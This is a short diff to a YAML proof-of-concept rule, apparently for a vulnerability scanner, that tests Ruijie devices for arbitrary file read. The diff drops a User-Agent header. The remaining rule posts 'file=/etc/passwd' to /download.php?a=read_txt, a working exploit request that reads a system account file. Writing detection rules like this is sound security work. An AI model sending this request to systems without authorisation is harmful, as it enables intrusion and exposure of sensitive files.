@@ -2,8 +2,6 @@ name: poc-yaml-ruijie-anyfile-read
 rules:
   - method: POST
     path: /download.php?a=read_txt
-    headers:
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
     follow_redirects: false
     body: |
       file=/etc/passwd
